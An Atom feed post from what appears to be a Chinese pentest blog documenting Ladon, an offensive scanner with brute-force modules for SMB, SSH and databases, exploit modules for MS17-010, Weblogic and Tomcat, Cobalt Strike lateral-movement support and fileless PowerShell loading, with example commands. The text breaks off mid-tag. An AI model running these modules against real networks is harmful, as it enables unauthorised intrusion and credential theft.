<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K8哥哥’s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://k8gege.org/"/>
  <updated>2020-05-24T15:58:03.982Z</updated>
  <id>http://k8gege.org/</id>
  
  <author>
    <name>K8gege</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ladon大型内网渗透扫描器&amp;Cobalt Strike</title>
    <link href="http://k8gege.org/p/648af4b3.html"/>
    <id>http://k8gege.org/p/648af4b3.html</id>
    <published>2020-05-24T02:20:24.000Z</published>
    <updated>2020-05-24T15:58:03.982Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-6.5-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p><h3 id="Ladon-for-Windows"><a href="#Ladon-for-Windows" class="headerlink" title="Ladon for Windows"></a>Ladon for Windows</h3><p><img data-original="http://k8gege.org/k8img/Ladon/Ladon.gif"></p><h3 id="Ladon-GUI"><a href="#Ladon-GUI" class="headerlink" title="Ladon GUI"></a>Ladon GUI</h3><p><img data-original="http://k8gege.org/k8img/Ladon/LadonGUI.gif"></p><h3 id="Ladon-for-Cobalt-Strike"><a href="#Ladon-for-Cobalt-Strike" class="headerlink" title="Ladon for Cobalt Strike"></a>Ladon for Cobalt Strike</h3><p><img data-original="http://k8gege.org/k8img/Ladon/CS_Ladon.gif"></p><h3 id="Ladon-for-PowerShell"><a href="#Ladon-for-PowerShell" class="headerlink" title="Ladon for PowerShell"></a>Ladon for PowerShell</h3><p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p><h3 id="Python-Ladon"><a href="#Python-Ladon" class="headerlink" title="Python Ladon"></a>Python Ladon</h3><p><img data-original="http://k8gege.org/k8img/Ladon//py/PyLadon.PNG"></p><h3 id="Ladon-for-Linux"><a href="#Ladon-for-Linux" class="headerlink" title="Ladon for Linux"></a>Ladon for Linux</h3><p><img data-original="http://k8gege.org/k8img/Ladon/kali/Kali_MS17010.gif"></p><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><table><thead><tr><th>ID</th><th>主题</th><th>URL</th></tr></thead><tbody><tr><td>0</td><td>Ladon完整文档</td><td><a href="https://k8gege.org/Ladon/">https://k8gege.org/Ladon/</a></td></tr><tr><td>1</td><td>Ladon基础文档</td><td><a href="http://k8gege.org/p/648af4b3.html">http://k8gege.org/p/648af4b3.html</a></td></tr><tr><td>2</td><td>基础用法详解</td><td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Usage</a></td></tr><tr><td>3</td><td>Cobalt Strike</td><td><a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor</a></td></tr><tr><td>4</td><td>Exp生成器使用</td><td><a href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a></td></tr><tr><td>5</td><td>高度自定义插件</td><td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></td></tr><tr><td>6</td><td>外部模块参考</td><td><a href="https://github.com/k8gege/K8CScan/wiki" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/wiki</a></td></tr><tr><td>7</td><td>PowerLadon</td><td><a href="https://github.com/k8gege/powerladon" target="_blank" rel="noopener">https://github.com/k8gege/powerladon</a></td></tr><tr><td>8</td><td>PythonLadon</td><td><a href="https://github.com/k8gege/PyLadon" target="_blank" rel="noopener">https://github.com/k8gege/PyLadon</a></td></tr><tr><td>9</td><td>LinuxLadon</td><td><a href="https://github.com/k8gege/KaliLadon" target="_blank" rel="noopener">https://github.com/k8gege/KaliLadon</a></td></tr><tr><td>10</td><td>漏洞演示视频</td><td><a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></td></tr><tr><td>11</td><td>Ladon6.0文档</td><td><a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a></td></tr><tr><td>12</td><td>Ladon6.2文档</td><td><a href="http://k8gege.org/p/39070.html">http://k8gege.org/p/39070.html</a></td></tr><tr><td>13</td><td>Ladon6.4文档</td><td><a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a></td></tr><tr><td>14</td><td>Ladon6.5文档</td><td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td></tr></tbody></table><h3 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h3><p>git clone <a href="https://github.com/k8gege/Ladon.git" target="_blank" rel="noopener">https://github.com/k8gege/Ladon.git</a><br>使用VS2012或以上版本分别编译.net 3.5、4.0版本EXE</p><h3 id="成品下载"><a href="#成品下载" class="headerlink" title="成品下载"></a>成品下载</h3><p><a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>Win7/2008或安装.net 2.x 3.x系统可使用Ladon.exe<br>Win8-win10或安装.net 4.x系统可使用Ladon40.exe</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无论内网还是外网渗透信息收集都是非常关键，信息收集越多越准确渗透的成功率就越高。<br>但成功率还受到漏洞影响，漏洞受时效性影响，对于大型内网扫描速度直接影响着成功率。<br>漏洞时效性1-2天，扫描内网或外网需1周时间，是否会因此错过很多或许可成功的漏洞？<br>对于那些拥有几百上千域名的大站来说，你发现越快成功率就越高，慢管理员就打补丁了。<br>因此我们需要一个支持批量C段/B段甚至A段的扫描器，添加自定义模块快速检测新出漏洞。</p><h3 id="关于Ladon"><a href="#关于Ladon" class="headerlink" title="关于Ladon"></a>关于Ladon</h3><p>Ladon音译: 拉登或拉冬。因集成了很多模块，每个模块又可独立成为一个工具，和百头巨龙有很多头类似。<br>Ladon是希腊神话中的神兽，看守金苹果的百头巨龙。它从不睡觉，被赫拉克勒斯借扛天巨人之手诱巨龙睡着<br>杀死巨龙并偷得了金苹果。巨龙死前将自己的魂魄封印在金苹果中，偷盗者将金苹果送给了白雪公主，公主<br>为了报恩将金苹果分给了七个小矮人，吃下以后他们变成了龙珠散落到世界各地，龙珠分为七颗，它蕴含着<br>可以令奇迹发生的力量。当集齐7颗龙珠念出咒语，就能召唤神龙，而神龙则会实现召唤者提出的一个愿望。</p><h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。6.5版本内置69个功能模块,外部模块17个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破12种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p><h3 id="使用简单"><a href="#使用简单" class="headerlink" title="使用简单"></a>使用简单</h3><p>虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手<br>只需一或两个参数就可用90%的功能,一个模块相当于一个新工具</p><h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>Ladon.exe可在安装有.net 2.0及以上版本Win系统中使用(Win7后系统自带.net)<br>如Cmd、PowerShell、远控Cmd、WebShell等，以及Cobalt Strike内存加载使用<br>Ladon.ps1完美兼容win7-win10 PowerShell，不看版本可远程加载实现无文件渗透</p><h4 id="Linux、Mac"><a href="#Linux、Mac" class="headerlink" title="Linux、Mac"></a>Linux、Mac</h4><p>安装Mono运行时,将KaliLodan改名为Ladon,通过mono执行Ladon即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install mono-runtime</span><br><span class="line">wget https://github.com/k8gege/Ladon/raw/master/KaliLadon -O Ladon</span><br><span class="line">mono Ladon 192.168.1.8/24 OnlinePC</span><br></pre></td></tr></table></figure><p>由于mono的兼容性，不保证Mac或Linux下所有功能均可用<br>就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好<br>测试发现有些功能的稳定性以及速度没有Windows系统快<br>未列功能系未测试或暂不可用功能，使用前请先看说明</p><p>实测：在Kali 2019下可使用功能较多，Ubuntu兼容性比不上Kali，MacOS未对所有功能进行测试</p><h3 id="奇葩条件"><a href="#奇葩条件" class="headerlink" title="奇葩条件"></a>奇葩条件</h3><p>实战并不那么顺利，有些内网转发后很卡或无法转发，只能将工具上传至目标<br>有些马可能上传两三M的程序都要半天甚至根本传不了，PY的几十M就更别想了<br>Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传500K程序吧<br>还不行也可PowerShell远程内存加载,这点是PY或GO编译的大程序无法比拟的</p><h3 id="宗旨"><a href="#宗旨" class="headerlink" title="宗旨"></a>宗旨</h3><p>一条龙服务，为用户提供一个简单易用、功能丰富、高度灵活的扫描工具</p><h3 id="特色"><a href="#特色" class="headerlink" title="特色"></a>特色</h3><p>扫描流量小<br>程序体积小<br>功能丰富强大<br>程序简单易用<br>插件支持多种语言<br>跨平台(Win/Kali/Ubuntu)等<br>支持Cobalt Strike插件化<br>支持PowerShell无文件渗透<br>Exp生成器可一键定制Poc<br>多版本适用各种环境</p><h3 id="程序参数功能"><a href="#程序参数功能" class="headerlink" title="程序参数功能"></a>程序参数功能</h3><p>1  支持指定IP扫描<br>2  支持指定域名扫描<br>3  支持指定机器名扫描<br>4  支持指定C段扫描(ip/24)<br>5  支持指定B段扫描(ip/16)<br>6  支持指定A段扫描(ip/8)<br>7  支持指定URL扫描<br>8  支持批量IP扫描(ip.txt)<br>9  支持批量C段扫描(ip24.txt)<br>10 支持批量B段扫描(ip16.txt)<br>11 支持批量URL扫描(url.txt)<br>12 支持批量域名扫描(domain.txt)<br>13 支持批量机器名扫描(host.txt)<br>14 支持批量字符串列表(str.txt)<br>15 支持主机帐密列表(check.txt)<br>16 支持用户密码列表(userpass.txt)<br>17 支持指定范围C段扫描<br>18 支持参数加载自定义DLL（仅限C#）<br>19 支持参数加载自定义EXE（仅限C#）<br>20 支持参数加载自定义INI配置文件<br>21 支持参数加载自定义PowerShell<br>22 支持自定义程序(系统命令或第三方程序即任意语言开发的程序或脚本)<br>23 插件(支持多种语言C#/Delphi/Golang/Python/VC/PowerShell)<br>24 支持Cobalt Strike(beacon命令行下扫描目标内网或跳板扫描外网目标)<br>25 支持CIDR格式IP扫描,如100.64.0.0/10，192.168.1.1/20等<br>26 INI配置支持自定义程序密码爆破</p><h3 id="内置功能模块-58"><a href="#内置功能模块-58" class="headerlink" title="内置功能模块(58)"></a>内置功能模块(58)</h3><h4 id="0x001-资产扫描-11"><a href="#0x001-资产扫描-11" class="headerlink" title="0x001 资产扫描(11)"></a>0x001 资产扫描(11)</h4><p>例子: Ladon OnlinePC(扫当前机器所处C段，其它模块同理)<br>例子: Ladon 192.168.1.8/24 OnlinePC</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>返回结果</th></tr></thead><tbody><tr><td>1</td><td><a href="http://k8gege.org/p/55476.html">Ping</a></td><td>存活主机扫描</td><td>存活IP(探测速度很快3-6秒/C段)</td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">OnlinePC</a></td><td>存活主机扫描</td><td>存活IP、Mac地址、机器名、设备制造商</td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">OnlineIP</a></td><td>仅存活主机IP</td><td>存活IP</td></tr><tr><td>4</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-C%E6%AE%B5%E5%9F%9F%E5%90%8DURL%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">UrlScan</a></td><td>URL域名扫描</td><td>同服URL（不验证IP、域名、Web标题）</td></tr><tr><td>5</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-C%E6%AE%B5%E6%97%81%E7%AB%99%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">SameWeb</a></td><td>同服域名扫描</td><td>同服URL（验证IP、域名、Web标题）</td></tr><tr><td>6</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">WebScan</a></td><td>Web信息扫描</td><td>存活IP、主机名、Banner、Web标题</td></tr><tr><td>7</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">WebDir</a></td><td>后台目录扫描</td><td>地址、HTTP状态</td></tr><tr><td>8</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4" target="_blank" rel="noopener">SubDomain</a></td><td>子域名爆破</td><td>子域名 (可用DomainIP/HostIP解析)</td></tr><tr><td>9</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD-%E6%89%B9%E9%87%8F%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">DomainIP</a></td><td>域名解析IP</td><td>域名、IP</td></tr><tr><td>10</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD-%E6%89%B9%E9%87%8F%E4%B8%BB%E6%9C%BA%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">HostIP</a></td><td>主机名转IP</td><td>IP、域名</td></tr><tr><td>11</td><td><a href="http://k8gege.org/p/39070.html">AdiDnsDump</a></td><td>域内机器信息获取(非域内请使用LdapScan探测)</td><td>IP、域名</td></tr></tbody></table><h4 id="0x002-指纹识别-服务识别-8"><a href="#0x002-指纹识别-服务识别-8" class="headerlink" title="0x002 指纹识别/服务识别(8)"></a>0x002 指纹识别/服务识别(8)</h4><p>例子: Ladon OsScan<br>例子: Ladon 192.168.1.8/24 OsScan</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>返回结果</th></tr></thead><tbody><tr><td>1</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A2%E6%B5%8B" target="_blank" rel="noopener">OsScan</a></td><td>操作系统版本探测</td><td>存活IP、工作组\机器名、操作系统、开放服务</td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB)" target="_blank" rel="noopener">PortScan</a></td><td>端口扫描含Banner</td><td>主机名、开放端口、服务识别、Banner、Web</td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB" target="_blank" rel="noopener">WhatCMS</a></td><td>75种Web指纹识别</td><td>URL、CMS、邮件系统、登陆页面、中间件(如Apache\Tomecat\IIS)等</td></tr><tr><td>4</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%80%9D%E7%A7%91%E8%AE%BE%E5%A4%87%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">CiscoScan</a></td><td>思科设备扫描</td><td>存活IP、设备型号、主机名、Boot、硬件版本</td></tr><tr><td>5</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%9A%E4%B8%BE%E5%86%85%E7%BD%91MSSQL%E4%B8%BB%E6%9C%BA" target="_blank" rel="noopener">EnumMssql</a></td><td>枚举Mssql数据库主机</td><td>数据库IP、机器名、SQL版本</td></tr><tr><td>6</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%9A%E4%B8%BE%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E8%B5%84%E6%BA%90" target="_blank" rel="noopener">EnumShare</a></td><td>枚举网络共享资源</td><td>域、存活IP、共享路径</td></tr><tr><td>7</td><td><a href="http://k8gege.org/p/39070.html">LdapScan</a></td><td>不指定密码时，仅探测LDAP服务器</td><td>IP是否LDAP服务器</td></tr><tr><td>8</td><td><a href="http://k8gege.org/p/39070.html">FtpScan</a></td><td>不指定密码时，仅探测FTP服务器</td><td>IP是否FTP服务器</td></tr></tbody></table><h4 id="0x003-口令检测-密码爆破-16"><a href="#0x003-口令检测-密码爆破-16" class="headerlink" title="0x003 口令检测/密码爆破(16)"></a>0x003 口令检测/密码爆破(16)</h4><p>[自定义端口(IP:端口)、帐密检测(用户 密码)、主机帐密检测(IP 端口 数据库 用户 密码)]</p><p>例子: Ladon SshScan<br>例子: Ladon 192.168.1.8/24 SshScan<br>例子: Ladon 192.168.1.8:22 SshScan (指定端口)<br>例子: Ladon test.rar RarScan</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>返回结果</th><th>依赖</th></tr></thead><tbody><tr><td>1</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-SmbScan(Windows)" target="_blank" rel="noopener">SmbScan</a></td><td>SMB密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-WmiScan(Windows)" target="_blank" rel="noopener">WmiScan</a></td><td>Wmi密码爆破(Windowns)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%B4%E7%88%86%E7%A0%B4-IpcScan(Windows)" target="_blank" rel="noopener">IpcScan</a></td><td>Ipc密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>4</td><td><a href="http://k8gege.org/p/56393.html">LdapScan</a></td><td>AD域密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>5</td><td><a href="http://k8gege.org/p/39070.html">SmbHashScan</a></td><td>SMB HASH密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>6</td><td><a href="http://k8gege.org/p/39070.html">WmiHashScan</a></td><td>WMI HASH密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>7</td><td><a href="http://k8gege.org/Ladon/sshscan.html">SshScan</a></td><td>SSH密码爆破(Linux)</td><td>检测过程、成功密码、LOG文件</td><td>Renci.SshNet.dll</td></tr><tr><td>8</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-MSSQL%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank" rel="noopener">MssqlScan</a></td><td>Mssql数据库密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>9</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-Oracle%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank" rel="noopener">OracleScan</a></td><td>Oracle数据库密码爆破</td><td>检测过程、成功密码、LOG文件</td><td>DDTek.Oracle.dll</td></tr><tr><td>10</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank" rel="noopener">MysqlScan</a></td><td>Mysql数据库密码爆破</td><td>检测过程、成功密码、LOG文件</td><td>MySql.Data.dll</td></tr><tr><td>11</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-Weblogic%E5%AF%86%E7%A0%81%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">WeblogicScan</a></td><td>Weblogic后台密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>12</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-VNC%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2" target="_blank" rel="noopener">VncScan</a></td><td>VNC远程桌面密码爆破</td><td>检测过程、成功密码、LOG文件</td><td>VncSharp.dll</td></tr><tr><td>13</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-FTP%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">FtpScan</a></td><td>Ftp服务器密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>14</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-Rar%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3" target="_blank" rel="noopener">RarScan</a></td><td>Rar压缩包密码爆破</td><td>检测过程、成功密码、LOG文件</td><td>Rar.exe</td></tr><tr><td>15</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-TomcatScan%E6%A8%A1%E5%9D%97Tomcat%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">TomcatScan</a></td><td>Tomcat后台登陆密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>16</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-HttpBasicScan%E6%A8%A1%E5%9D%97phpMyAdmin%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">HttpBasicScan</a></td><td>HttpBasic401认证密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr></tbody></table><h4 id="0x004-漏洞检测-漏洞利用-8"><a href="#0x004-漏洞检测-漏洞利用-8" class="headerlink" title="0x004 漏洞检测/漏洞利用(8)"></a>0x004 漏洞检测/漏洞利用(8)</h4><p>例子: Ladon MS17010<br>例子: Ladon 192.168.1.8/24 MS17010<br>例子: Ladon <a href="http://192.168.1.8" target="_blank" rel="noopener">http://192.168.1.8</a> WeblogicExp</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th></tr></thead><tbody><tr><td>1</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-MS17010%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">MS17010</a></td><td>SMB漏洞检测(CVE-2017-0143/CVE-2017-0144/CVE-2017-0145/CVE-2017-0146/CVE-2017-0148)</td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-2725-Weblogic-GetShell-Exploit" target="_blank" rel="noopener">WeblogicPoc</a></td><td>Weblogic漏洞检测(CVE-2019-2725/<a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894" target="_blank" rel="noopener">CVE-2018-2894</a>)</td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">PhpStudyPoc</a></td><td>PhpStudy后门检测(phpstudy 2016/phpstudy 2018)</td></tr><tr><td>4</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F--CVE-2016-3088" target="_blank" rel="noopener">ActivemqPoc</a></td><td>ActiveMQ漏洞检测(CVE-2016-3088)</td></tr><tr><td>5</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2017-12615" target="_blank" rel="noopener">TomcatPoc</a></td><td>Tomcat漏洞检测(CVE-2017-12615)</td></tr><tr><td>6</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-2725-Weblogic-GetShell-Exploit" target="_blank" rel="noopener">WeblogicExp</a></td><td>Weblogic漏洞利用(CVE-2019-2725)</td></tr><tr><td>7</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2017-12615" target="_blank" rel="noopener">TomcatExp</a></td><td>Tomcat漏洞利用(CVE-2017-12615)</td></tr><tr><td>8</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-Struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">Struts2Poc</a></td><td>Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)</td></tr></tbody></table><h4 id="0x005-加密解密-4"><a href="#0x005-加密解密-4" class="headerlink" title="0x005 加密解密(4)"></a>0x005 加密解密(4)</h4><p>例子: Ladon 字符串 EnHex<br>例子: Ladon EnHex (批量str.txt)</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th></tr></thead><tbody><tr><td>1</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FHex%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">EnHex</a></td><td>批量Hex密码加密</td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FHex%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">DeHex</a></td><td>批量Hex密码解密</td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FBase64%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">EnBase64</a></td><td>批量Base64密码加密</td></tr><tr><td>4</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FBase64%E5%AF%86%E7%A0%81" target="_blank" 